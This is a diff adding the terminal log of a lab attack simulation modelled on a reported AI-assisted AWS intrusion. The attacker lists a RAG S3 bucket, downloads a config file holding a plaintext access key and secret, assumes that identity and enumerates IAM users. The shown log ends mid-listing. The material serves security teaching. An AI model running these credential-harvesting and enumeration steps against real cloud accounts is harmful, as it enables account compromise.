@@ -1,0 +1,509 @@
+[0;32m============================================================[0m
+[0;32mAI-Assisted Cloud Intrusion: 8 Minutes to Admin[0m
+[0;32mSysdig TRT Attack Simulation[0m
+[0;32m============================================================[0m
+
+Source: https://www.sysdig.com/blog/ai-assisted-cloud-intrusion-achieves-admin-access-in-8-minutes
+
+[1;33mPhase 0: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-8min-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+RAG bucket: pl-prod-8min-rag-data-697683661464-66pzel
+EC2-init function: pl-prod-8min-ec2-init
+Target admin user: pl-prod-8min-frick
+Region: us-east-1
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[0;34m============================================================[0m
+[0;34mPHASE 1: Initial Access (T1552.001 — Credentials In Files)[0m
+[0;34m============================================================[0m
+
+[1;33mThe attacker has obtained credentials for pl-prod-8min-starting-user through an[0m
+[1;33minitial compromise (phishing, dark-web purchase, etc). They now verify identity[0m
+[1;33mand begin enumerating accessible resources.[0m
+
+[2m[Attacker (pl-prod-8min-starting-user)] $ aws sts get-caller-identity[0m
+Identity: arn:aws:iam::123456789012:user/pl-prod-8min-starting-user
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Confirmed starting user identity[0m
+
+[1;33mThe attacker enumerates accessible S3 buckets. The starting user has s3:ListBucket[0m
+[1;33mon a private RAG data bucket used by the ML pipeline.[0m
+
+
+[0;36m[Attacker (pl-prod-8min-starting-user)] $ aws s3 ls s3://pl-prod-8min-rag-data-697683661464-66pzel/ --recursive[0m
+2026-04-09 15:03:00        506 config/rag-pipeline-config.json
+2026-04-09 15:03:00         48 data/embeddings/readme.md
+2026-04-09 15:03:00        801 data/knowledge-base/product-faq.txt
+2026-04-09 15:03:00        621 logs/pipeline-run-2025-11-27.log
+
+[0;32m✓ Bucket listing succeeded — config/rag-pipeline-config.json is visible[0m
+
+[1;33mThe attacker notices config/rag-pipeline-config.json — this looks like it may[0m
+[1;33mcontain pipeline configuration including connection details or credentials.[0m
+
+
+[0;36m[Attacker (pl-prod-8min-starting-user)] $ aws s3 cp s3://pl-prod-8min-rag-data-697683661464-66pzel/config/rag-pipeline-config.json /tmp/rag-config.json[0m
+Completed 506 Bytes/506 Bytes (1.3 KiB/s) with 1 file(s) remaining
+download: s3://pl-prod-8min-rag-data-697683661464-66pzel/config/rag-pipeline-config.json to ../../../../../../../../../../tmp/rag-config.json
+
+Config file contents:
+{
+  "aws_credentials": {
+    "_comment": "TODO: migrate to Secrets Manager before prod deployment",
+    "access_key_id": "AKIAXXXXXXXXXXXXXXXXXX",
+    "secret_access_key": "Iy2KmLep6GUqqZEotbxkJhLDYzsHrhWhL/MGPVza"
+  },
+  "data_sources": [
+    "s3://internal-data-lake/customer-records/",
+    "s3://internal-data-lake/product-catalog/"
+  ],
+  "embedding_model": "amazon.titan-embed-text-v1",
+  "pipeline_name": "customer-data-rag",
+  "schedule": "0 2 * * *",
+  "vector_store": {
+    "endpoint": "https://search.internal.example.com",
+    "type": "opensearch"
+  },
+  "version": "1.2.3"
+}
+
+[1;33mThe config file contains AWS credentials in plaintext — a developer left them[0m
+[1;33mwith a TODO to move them to Secrets Manager. The attacker extracts them.[0m
+
+Extracted Access Key ID: AKIA2E4JP2...
+[0;32m✓ Extracted embedded IAM credentials from RAG config[0m
+
+[1;33mThe attacker switches to the extracted credentials and verifies the new identity.[0m
+
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws sts get-caller-identity[0m
+Identity: arn:aws:iam::123456789012:user/pl-prod-8min-compromised-user
+[0;32m✓ Now operating as pl-prod-8min-compromised-user[0m
+
+[0;34m============================================================[0m
+[0;34mPHASE 2: Reconnaissance (T1087.004 — Cloud Accounts, T1613)[0m
+[0;34m============================================================[0m
+
+[2m[Elapsed: 8s][0m
+
+[1;33mThe attacker (augmented by an AI assistant per the blog post) runs broad IAM[0m
+[1;33menumeration to identify high-value targets. The compromised user has several[0m
+[1;33mhelpful permissions that accelerate discovery.[0m
+
+[2m[Attacker (pl-prod-8min-compromised-user)] $ aws iam list-users[0m
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+|                                                                                                          ListUsers                                                                                                         |
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+||                                                                                                           Users                                                                                                          ||
+|+-----------------------------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-----------------------------------------------------+|
+||                                        Arn                                        |      CreateDate       |   PasswordLastUsed    | Path  |        UserId          |                      UserName                       ||
+|+-----------------------------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-----------------------------------------------------+|
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582225                       |  2026-03-03T23:57:05Z |                       |  /    |  AIDA2E4JP2KMDN764OVDX |  pathrunner-admin-1772582225                        ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582487                       |  2026-03-04T00:01:27Z |                       |  /    |  AIDA2E4JP2KMIGZOBA63O |  pathrunner-admin-1772582487                        ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582552                       |  2026-03-04T00:02:32Z |  2026-03-04T00:04:42Z |  /    |  AIDA2E4JP2KMGNBJR4AJO |  pathrunner-admin-1772582552                        ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772590136                       |  2026-03-04T02:08:56Z |                       |  /    |  AIDA2E4JP2KMCMDWCFI7M |  pathrunner-admin-1772590136                        ||
+||  arn:aws:iam::123456789012:user/pl-admin-user-for-cleanup-scripts                 |  2026-03-23T20:14:09Z |                       |  /    |  AIDA2E4JP2KMF57AM4TDA |  pl-admin-user-for-cleanup-scripts                  ||
+||  arn:aws:iam::123456789012:user/pl-Jeremy                                         |  2026-04-17T09:03:49Z |                       |  /    |  AIDA2E4JP2KMBK3BYP6LG |  pl-Jeremy                                          ||
+||  arn:aws:iam::123456789012:user/pl-prod-8min-admingh                              |  2026-04-09T19:02:56Z |                       |  /    |  AIDA2E4JP2KMIGLWOE54K |  pl-prod-8min-admingh                               ||
+||  arn:aws:iam::123456789012:user/pl-prod-8min-azureadmanager                       |  2026-04-09T19:02:56Z |                       |  /    |  AIDA2E4JP2KMPNVDK74SJ |  pl-prod-8min-azureadmanager                        ||
+||  arn:aws:iam::123456789012:user/pl-prod-8min-ci-runner                            |  2026-04-09T19:02:56Z |                       |  /    |  AIDA2E4JP2KMAXZFFDOXQ |  pl-prod-8min-ci-runner                             ||
+||  arn:aws:iam::123456789012:user/pl-prod-8min-compromised-user                     |  2026-04-09T19:02:56Z |                       |  /    |  AIDA2E4JP2KMDLAFAOWUB |  pl-prod-8min-compromised-user                      ||
+||  arn:aws:iam::123456789012:user/pl-prod-8min-deploy-svc                           |  2026-04-09T19:02:56Z |                       |  /    |  AIDA2E4JP2KMM425IN7VE |  pl-prod-8min-deploy-svc                            ||
+||  arn:aws:iam::123456789012:user/pl-prod-8min-frick                                |  2026-04-09T19:02:57Z |                       |  /    |  AIDA2E4JP2KMHREP2VSRL |  pl-prod-8min-frick                                 ||
+||  arn:aws:iam::123456789012:user/pl-prod-8min-monitoring                           |  2026-04-09T19:02:57Z |                       |  /    |  AIDA2E4JP2KMN75BDVNNC |  pl-prod-8min-monitoring                            ||
+||  arn:aws:iam::123456789012:user/pl-prod-8min-rocker                               |  2026-04-09T19:02:56Z |                       |  /    |  AIDA2E4JP2KMO4WSR2PJO |  pl-prod-8min-rocker                                ||
+||  arn:aws:iam::123456789012:user/pl-prod-8min-starting-user                        |  2026-04-09T19:02:56Z |                       |  /    |  AIDA2E4JP2KMEKWDIDKG7 |  pl-prod-8min-starting-user                         ||
+||  arn:aws:iam::123456789012:user/pl-prod-apprunner-001-to-admin-starting-user      |  2026-04-08T12:49:45Z |                       |  /    |  AIDA2E4JP2KMPZA3H2T4X |  pl-prod-apprunner-001-to-admin-starting-user       ||
+||  arn:aws:iam::123456789012:user/pl-prod-bedrock-001-to-admin-starting-user        |  2026-04-02T19:19:10Z |                       |  /    |  AIDA2E4JP2KMC52VI4D2Q |  pl-prod-bedrock-001-to-admin-starting-user         ||
+||  arn:aws:iam::123456789012:user/pl-prod-bedrock-002-to-admin-starting-user        |  2026-04-03T17:02:49Z |                       |  /    |  AIDA2E4JP2KMO7755UCOG |  pl-prod-bedrock-002-to-admin-starting-user         ||
+||  arn:aws:iam::123456789012:user/pl-prod-cloudformation-001-to-admin-starting-user |  2026-04-17T09:03:42Z |                       |  /    |  AIDA2E4JP2KMLPE5VBCFJ |  pl-prod-cloudformation-001-to-admin-starting-user  ||
+||  arn:aws:iam::123456789012:user/pl-prod-cloudformation-002-to-admin-starting-user |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMKHYSFXBUD |  pl-prod-cloudformation-002-to-admin-starting-user  ||
+||  arn:aws:iam::123456789012:user/pl-prod-cloudformation-003-to-admin-starting-user |  2026-04-17T09:03:37Z |                       |  /    |  AIDA2E4JP2KMHYS7WFXVP |  pl-prod-cloudformation-003-to-admin-starting-user  ||
+||  arn:aws:iam::123456789012:user/pl-prod-cloudformation-004-to-admin-starting-user |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMKT46JRQHZ |  pl-prod-cloudformation-004-to-admin-starting-user  ||
+||  arn:aws:iam::123456789012:user/pl-prod-cloudformation-005-to-admin-starting-user |  2026-04-17T09:03:52Z |                       |  /    |  AIDA2E4JP2KMGDIMXPPTZ |  pl-prod-cloudformation-005-to-admin-starting-user  ||
+||  arn:aws:iam::123456789012:user/pl-prod-codebuild-001-to-admin-starting-user      |  2026-04-17T09:03:35Z |                       |  /    |  AIDA2E4JP2KMMEECDNV63 |  pl-prod-codebuild-001-to-admin-starting-user       ||
+||  arn:aws:iam::123456789012:user/pl-prod-codebuild-002-to-admin-starting-user      |  2026-04-17T09:03:35Z |                       |  /    |  AIDA2E4JP2KMERY6UWFLV |  pl-prod-codebuild-002-to-admin-starting-user       ||
+||  arn:aws:iam::123456789012:user/pl-prod-codebuild-003-to-admin-starting-user      |  2026-04-17T09:03:41Z |                       |  /    |  AIDA2E4JP2KMFASJVL7D7 |  pl-prod-codebuild-003-to-admin-starting-user       ||
+||  arn:aws:iam::123456789012:user/pl-prod-codebuild-004-to-admin-starting-user      |  2026-04-17T09:03:39Z |                       |  /    |  AIDA2E4JP2KMJFEOJJARG |  pl-prod-codebuild-004-to-admin-starting-user       ||
+||  arn:aws:iam::123456789012:user/pl-prod-ctf-001-starting-user                     |  2026-04-04T02:42:22Z |                       |  /    |  AIDA2E4JP2KMK6VMVQU5X |  pl-prod-ctf-001-starting-user                      ||
+||  arn:aws:iam::123456789012:user/pl-prod-ctf-002-starting-user                     |  2026-04-04T02:42:22Z |                       |  /    |  AIDA2E4JP2KMBY5FV6SOI |  pl-prod-ctf-002-starting-user                      ||
+||  arn:aws:iam::123456789012:user/pl-prod-ec2-001-to-admin-starting-user            |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMN64EWZIT7 |  pl-prod-ec2-001-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-ec2-004-to-admin-starting-user            |  2026-04-17T09:03:37Z |                       |  /    |  AIDA2E4JP2KMGP7VAYAHF |  pl-prod-ec2-004-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-ec2-005-to-admin-starting-user            |  2026-04-17T09:03:35Z |                       |  /    |  AIDA2E4JP2KMG2CFMMG7F |  pl-prod-ec2-005-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-ecs-001-to-admin-starting-user            |  2026-04-17T09:03:43Z |                       |  /    |  AIDA2E4JP2KMGA45XI7EA |  pl-prod-ecs-001-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-ecs-002-to-admin-starting-user            |  2026-04-17T09:03:54Z |                       |  /    |  AIDA2E4JP2KMB6TFOBIME |  pl-prod-ecs-002-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-ecs-003-to-admin-starting-user            |  2026-04-17T09:03:51Z |                       |  /    |  AIDA2E4JP2KMJLW35VBE6 |  pl-prod-ecs-003-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-ecs-004-to-admin-starting-user            |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMAWOITJKUO |  pl-prod-ecs-004-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-ecs-008-to-admin-starting-user            |  2026-04-27T13:23:24Z |                       |  /    |  AIDA2E4JP2KMPW5GCDIJR |  pl-prod-ecs-008-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-ecs-009-to-admin-starting-user            |  2026-04-27T13:23:23Z |                       |  /    |  AIDA2E4JP2KMHD2POOMSL |  pl-prod-ecs-009-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-glue-001-to-admin-starting-user           |  2026-04-17T09:03:50Z |                       |  /    |  AIDA2E4JP2KMDBGSA36Y6 |  pl-prod-glue-001-to-admin-starting-user            ||
+||  arn:aws:iam::123456789012:user/pl-prod-glue-001-to-bucket-starting-user          |  2026-04-17T09:03:43Z |                       |  /    |  AIDA2E4JP2KMJG5MIWQJ4 |  pl-prod-glue-001-to-bucket-starting-user           ||
+||  arn:aws:iam::123456789012:user/pl-prod-glue-003-to-admin-starting-user           |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMKGG6NRHT4 |  pl-prod-glue-003-to-admin-starting-user            ||
+||  arn:aws:iam::123456789012:user/pl-prod-glue-005-to-admin-starting-user           |  2026-04-23T19:39:09Z |                       |  /    |  AIDA2E4JP2KMBYEVFC2QM |  pl-prod-glue-005-to-admin-starting-user            ||
+||  arn:aws:iam::123456789012:user/pl-prod-glue-007-to-admin-starting-user           |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMCFE2CXHKN |  pl-prod-glue-007-to-admin-starting-user            ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-001-to-admin-starting-user            |  2026-04-17T09:03:52Z |                       |  /    |  AIDA2E4JP2KMMCNIAKUKY |  pl-prod-iam-001-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-003-to-admin-starting-user            |  2026-04-17T09:03:49Z |                       |  /    |  AIDA2E4JP2KMLX3DVLN26 |  pl-prod-iam-003-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-003-to-admin-target-user              |  2026-04-17T09:03:41Z |                       |  /    |  AIDA2E4JP2KMB2JEDZL5G |  pl-prod-iam-003-to-admin-target-user               ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-003-to-bucket-starting-user           |  2026-04-17T09:03:37Z |                       |  /    |  AIDA2E4JP2KMCNLYMQBA6 |  pl-prod-iam-003-to-bucket-starting-user            ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-003-to-bucket-target-user             |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMPG5HKV2EM |  pl-prod-iam-003-to-bucket-target-user              ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-004-bucket-hop1                       |  2026-04-17T09:03:43Z |                       |  /    |  AIDA2E4JP2KMJTN4KZCYV |  pl-prod-iam-004-bucket-hop1                        ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-004-bucket-starting-user              |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMHJRWQKZAZ |  pl-prod-iam-004-bucket-starting-user               ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-004-to-admin-starting-user            |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMLJTBOGQ43 |  pl-prod-iam-004-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-004-to-admin-target-user              |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMEZS42NNU6 |  pl-prod-iam-004-to-admin-target-user               ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-005-to-admin-starting-user            |  2026-04-17T09:03:34Z |                       |  /    |  AIDA2E4JP2KMNEKCGJ2BZ |  pl-prod-iam-005-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-005-to-bucket-starting-user           |  2026-04-17T09:03:45Z |                       |  /    |  AIDA2E4JP2KMGELHTJGIU |  pl-prod-iam-005-to-bucket-starting-user            ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-006-to-admin-starting-user            |  2026-04-17T09:03:35Z |                       |  /    |  AIDA2E4JP2KMKKQEG7X55 |  pl-prod-iam-006-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-006-to-admin-target-user              |  2026-04-17T09:03:50Z |                       |  /    |  AIDA2E4JP2KMD6QP53YI4 |  pl-prod-iam-006-to-admin-target-user               ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-006-to-bucket-starting-user           |  2026-04-17T09:03:34Z |                       |  /    |  AIDA2E4JP2KMEFRJDAZJD |  pl-prod-iam-006-to-bucket-starting-user            ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-006-to-bucket-user                    |  2026-04-17T09:03:37Z |                       |  /    |  AIDA2E4JP2KMA63L73CTD |  pl-prod-iam-006-to-bucket-user                     ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-008-to-admin-starting-user            |  2026-04-17T09:03:37Z |                       |  /    |  AIDA2E4JP2KML7EMEFIUG |  pl-prod-iam-008-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-009-to-admin-starting-user            |  2026-04-17T09:03:52Z |                       |  /    |  AIDA2E4JP2KMJIMKIKX5Q |  pl-prod-iam-009-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-009-to-bucket-starting-user           |  2026-04-17T09:03:44Z |                       |  /    |  AIDA2E4JP2KMLGHW6AMOR |  pl-prod-iam-009-to-bucket-starting-user            ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-010-to-admin-starting-user            |  2026-04-17T09:03:33Z |                       |  /    |  AIDA2E4JP2KMDMFKSFBVC |  pl-prod-iam-010-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-011-to-admin-paul                     |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMLYGB726EF |  pl-prod-iam-011-to-admin-paul                      ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-012-to-admin-starting-user            |  2026-04-17T09:03:35Z |                       |  /    |  AIDA2E4JP2KMH5W2ZIOQE |  pl-prod-iam-012-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-012-to-bucket-starting-user           |  2026-04-17T09:03:37Z |                       |  /    |  AIDA2E4JP2KMJKT6CCEH6 |  pl-prod-iam-012-to-bucket-starting-user            ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-013-to-admin-user                     |  2026-04-17T09:03:50Z |                       |  /    |  AIDA2E4JP2KMNSWLRODIQ |  pl-prod-iam-013-to-admin-user                      ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-014-to-admin-starting-user            |  2026-04-17T09:03:41Z |                       |  /    |  AIDA2E4JP2KMIGC6BEGWG |  pl-prod-iam-014-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-015-to-admin-starting-user            |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMM2KGNH34T |  pl-prod-iam-015-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-015-to-admin-target-user              |  2026-04-17T09:03:41Z |                       |  /    |  AIDA2E4JP2KMOKQI3YGES |  pl-prod-iam-015-to-admin-target-user               ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-016-to-admin-starting-user            |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMDB5UNSGEX |  pl-prod-iam-016-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-017-to-admin-starting-user            |  2026-04-17T09:03:34Z |                       |  /    |  AIDA2E4JP2KMLZT2KRZHN |  pl-prod-iam-017-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-018-to-admin-starting-user            |  2026-04-17T09:03:46Z |                       |  /    |  AIDA2E4JP2KMF7I6WQS6P |  pl-prod-iam-018-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-018-to-admin-target-user              |  2026-04-17T09:03:47Z |                       |  /    |  AIDA2E4JP2KMHP6HOK6NA |  pl-prod-iam-018-to-admin-target-user               ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-019-to-admin-starting-user            |  2026-04-17T09:03:37Z |                       |  /    |  AIDA2E4JP2KMEYK5627UO |  pl-prod-iam-019-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-020-to-admin-starting-user            |  2026-04-17T09:03:50Z |                       |  /    |  AIDA2E4JP2KMKVHFQGTFF |  pl-prod-iam-020-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-iam-021-to-admin-starting-user            |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMF6WWBD4QD |  pl-prod-iam-021-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-lambda-001-to-admin-starting-user         |  2026-04-03T16:16:53Z |                       |  /    |  AIDA2E4JP2KMC7AMDERCX |  pl-prod-lambda-001-to-admin-starting-user          ||
+||  arn:aws:iam::123456789012:user/pl-prod-lambda-002-to-admin-starting-user         |  2026-04-17T09:03:42Z |                       |  /    |  AIDA2E4JP2KMLZBPMYDPL |  pl-prod-lambda-002-to-admin-starting-user          ||
+||  arn:aws:iam::123456789012:user/pl-prod-lambda-003-to-admin-starting-user         |  2026-04-17T09:03:39Z |                       |  /    |  AIDA2E4JP2KMFZGAQZ7NG |  pl-prod-lambda-003-to-admin-starting-user          ||
+||  arn:aws:iam::123456789012:user/pl-prod-lambda-004-to-admin-starting-user         |  2026-04-17T09:03:35Z |                       |  /    |  AIDA2E4JP2KMAO7FSX6ZF |  pl-prod-lambda-004-to-admin-starting-user          ||
+||  arn:aws:iam::123456789012:user/pl-prod-lambda-004-to-iam-002-admin-user          |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMM3HFJHALB |  pl-prod-lambda-004-to-iam-002-admin-user           ||
+||  arn:aws:iam::123456789012:user/pl-prod-lambda-004-to-iam-002-starting-user       |  2026-04-17T09:03:52Z |                       |  /    |  AIDA2E4JP2KMHD73ZV7IA |  pl-prod-lambda-004-to-iam-002-starting-user        ||
+||  arn:aws:iam::123456789012:user/pl-prod-lambda-005-to-admin-starting-user         |  2026-04-17T09:03:35Z |                       |  /    |  AIDA2E4JP2KML2I2MQH5H |  pl-prod-lambda-005-to-admin-starting-user          ||
+||  arn:aws:iam::123456789012:user/pl-prod-lambda-006-to-admin-starting-user         |  2026-04-17T09:03:51Z |                       |  /    |  AIDA2E4JP2KMHCEK2K5KU |  pl-prod-lambda-006-to-admin-starting-user          ||
+||  arn:aws:iam::123456789012:user/pl-prod-mpc-to-admin-starting-user                |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMMX554C5YV |  pl-prod-mpc-to-admin-starting-user                 ||
+||  arn:aws:iam::123456789012:user/pl-prod-rcs-to-bucket-starting-user               |  2026-04-17T09:03:41Z |                       |  /    |  AIDA2E4JP2KMOXI6IXBKJ |  pl-prod-rcs-to-bucket-starting-user                ||
+||  arn:aws:iam::123456789012:user/pl-prod-role-chain-user                           |  2026-04-17T09:03:38Z |                       |  /    |  AIDA2E4JP2KMNOVCEAYDO |  pl-prod-role-chain-user                            ||
+||  arn:aws:iam::123456789012:user/pl-prod-sagemaker-001-to-admin-starting-user      |  2026-04-17T09:03:34Z |                       |  /    |  AIDA2E4JP2KMEQWWJZBQ6 |  pl-prod-sagemaker-001-to-admin-starting-user       ||
+||  arn:aws:iam::123456789012:user/pl-prod-sagemaker-002-to-admin-starting-user      |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMFAFLJWWFD |  pl-prod-sagemaker-002-to-admin-starting-user       ||
+||  arn:aws:iam::123456789012:user/pl-prod-sagemaker-003-to-admin-starting-user      |  2026-04-17T09:03:38Z |                       |  /    |  AIDA2E4JP2KMIYV7LPOQ3 |  pl-prod-sagemaker-003-to-admin-starting-user       ||
+||  arn:aws:iam::123456789012:user/pl-prod-sts-001-to-admin-starting-user            |  2026-04-03T16:38:00Z |                       |  /    |  AIDA2E4JP2KMAEPHNKFIJ |  pl-prod-sts-001-to-admin-starting-user             ||
+||  arn:aws:iam::123456789012:user/pl-prod-sts-001-to-bucket-starting-user           |  2026-04-03T16:38:00Z |                       |  /    |  AIDA2E4JP2KMERDPKEH4L |  pl-prod-sts-001-to-bucket-starting-user            ||
+||  arn:aws:iam::123456789012:user/pl-prod-sts001-ecs002-starting-user               |  2026-04-17T09:03:36Z |                       |  /    |  AIDA2E4JP2KMMFUM3YYS4 |  pl-prod-sts001-ecs002-starting-user                ||
+||  arn:aws:iam::123456789012:user/pl-readonly-user-prod                             |  2026-03-23T20:14:09Z |                       |  /    |  AIDA2E4JP2KMHENXVDCYJ |  pl-readonly-user-prod                              ||
+||  arn:aws:iam::123456789012:user/pra-auditor-braket-001-copy                       |  2026-04-28T17:43:31Z |                       |  /    |  AIDA2E4JP2KMGNCI6Q2II |  pra-auditor-braket-001-copy                        ||
+||  arn:aws:iam::123456789012:user/pra-auditor-ecs-010                               |  2026-04-28T19:05:02Z |                       |  /    |  AIDA2E4JP2KML6JD54KEO |  pra-auditor-ecs-010                                ||
+||  arn:aws:iam::123456789012:user/pra-auditor-fis-001-copy                          |  2026-05-01T19:22:35Z |                       |  /    |  AIDA2E4JP2KMAATL3F2SV |  pra-auditor-fis-001-copy                           ||
+||  arn:aws:iam::123456789012:user/pra-auditor-iam-007-val-copy-copy                 |  2026-04-28T17:43:32Z |                       |  /    |  AIDA2E4JP2KMAVQGJWERY |  pra-auditor-iam-007-val-copy-copy                  ||
+||  arn:aws:iam::123456789012:user/pra-auditor-lambda-007-copy                       |  2026-04-28T17:41:52Z |                       |  /    |  AIDA2E4JP2KMLAV46QZBT |  pra-auditor-lambda-007-copy                        ||
+||  arn:aws:iam::123456789012:user/pra-auditor-omics-002                             |  2026-04-30T13:05:44Z |                       |  /    |  AIDA2E4JP2KMK7QOVVD3W |  pra-auditor-omics-002                              ||
+||  arn:aws:iam::123456789012:user/pra-auditor-synthetics-002                        |  2026-04-30T13:42:06Z |                       |  /    |  AIDA2E4JP2KMEVG6FCLEN |  pra-auditor-synthetics-002                         ||
+||  arn:aws:iam::123456789012:user/pra-auditor-user-scheduler-001                    |  2026-04-28T18:25:59Z |                       |  /    |  AIDA2E4JP2KMKVZQRSE6L |  pra-auditor-user-scheduler-001                     ||
+||  arn:aws:iam::123456789012:user/pra-braket-001-copy-copy-auditor                  |  2026-04-28T18:02:13Z |                       |  /    |  AIDA2E4JP2KMOLXCV3T4X |  pra-braket-001-copy-copy-auditor                   ||
+||  arn:aws:iam::123456789012:user/pra-braket-001-copy-copy-starting                 |  2026-04-28T18:02:13Z |                       |  /    |  AIDA2E4JP2KMBZI7AXWEQ |  pra-braket-001-copy-copy-starting                  ||
+||  arn:aws:iam::123456789012:user/pra-starting-braket-001-copy                      |  2026-04-28T17:43:31Z |                       |  /    |  AIDA2E4JP2KMFDFQBXUJW |  pra-starting-braket-001-copy                       ||
+||  arn:aws:iam::123456789012:user/pra-starting-fis-001-copy                         |  2026-05-01T19:22:35Z |                       |  /    |  AIDA2E4JP2KMKWZGUJZDT |  pra-starting-fis-001-copy                          ||
+||  arn:aws:iam::123456789012:user/pra-starting-iam-007-val-copy-copy                |  2026-04-28T17:43:32Z |                       |  /    |  AIDA2E4JP2KME4VKAIQOG |  pra-starting-iam-007-val-copy-copy                 ||
+||  arn:aws:iam::123456789012:user/pra-starting-lambda-007-copy                      |  2026-04-28T17:41:52Z |                       |  /    |  AIDA2E4JP2KMD6GHHP7KC |  pra-starting-lambda-007-copy                       ||
+||  arn:aws:iam::123456789012:user/pra-starting-omics-002                            |  2026-04-30T13:05:43Z |                       |  /    |  AIDA2E4JP2KMJZBFZIUGQ |  pra-starting-omics-002                             ||
+||  arn:aws:iam::123456789012:user/pra-starting-synthetics-002                       |  2026-04-30T13:42:06Z |                       |  /    |  AIDA2E4JP2KMDT7IPGXSZ |  pra-starting-synthetics-002                        ||
+||  arn:aws:iam::123456789012:user/pra-starting-user-autoscaling-001                 |  2026-04-27T11:41:05Z |                       |  /    |  AIDA2E4JP2KMBVWD562OL |  pra-starting-user-autoscaling-001                  ||
+||  arn:aws:iam::123456789012:user/pra-starting-user-ecs-007                         |  2026-04-27T13:58:46Z |                       |  /    |  AIDA2E4JP2KMBP7W7OC7B |  pra-starting-user-ecs-007                          ||
+||  arn:aws:iam::123456789012:user/pra-starting-user-ecs-010                         |  2026-04-27T14:04:40Z |                       |  /    |  AIDA2E4JP2KMDDXZ5DTEE |  pra-starting-user-ecs-010                          ||
+||  arn:aws:iam::123456789012:user/pra-starting-user-glue-007                        |  2026-04-27T11:41:32Z |                       |  /    |  AIDA2E4JP2KMESANGWB7E |  pra-starting-user-glue-007                         ||
+||  arn:aws:iam::123456789012:user/pra-starting-user-iam-007-val-copy                |  2026-04-27T19:46:51Z |                       |  /    |  AIDA2E4JP2KMNEPMLO2HN |  pra-starting-user-iam-007-val-copy                 ||
